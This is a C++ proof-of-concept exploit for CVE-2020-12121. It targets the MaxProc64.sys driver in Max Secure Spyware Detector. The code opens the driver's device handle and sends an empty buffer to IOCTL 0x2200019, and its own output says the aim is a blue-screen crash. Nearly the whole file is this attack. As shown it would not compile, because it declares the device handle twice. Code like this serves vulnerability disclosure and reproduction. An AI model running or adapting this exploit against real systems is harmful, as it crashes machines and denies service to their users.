/*

CVE-2020-12121

In Max Secure Max Spyware Detector 1.0.0.044, the driver file (MaxProc64.sys) allows local users to cause a denial of service (BSOD)
or possibly have unspecified other impact because of not validating input values from IOCtls 0x2200019. 
This also extends to the various other products from Max Secure which include this driver. 

Author: FULLSHADE

*/

#include <windows.h>
#include <iostream>

#define IOCTL 0x2200019
#define DEVICE_NAME "\\\\.\\MaxProc64"

int main(){
    
    HANDLE hDevice;
    DWORD nbBytes;
    
    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                    GENERIC_READ | GENERIC_WRITE,
                                    0, 0,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    
    if(hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Failed to establish a handler to the device - " << GetLastError();
        exit(1);
    } else {
        std::cout << "[+] Handler sucessfully established to the device" << std::endl;
    }
    
    std::cout << "Sending malformed buffer to the IOCTL: " << IOCTL;
    std::cout << "Triggering BSOD, press any button to envoke BSOD";
    
    system("pause");        
    
    int reSend = DeviceIoControl(hDevice, 0x2200019, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
    
    if(!reSend){
        std::cout << "[!] POC failed! - " << GetLastError(); 
        
    } else {
        std::cout << "[+] IOCTL & malformed buffer sent sucessfully";           
    }
    return 0;
}
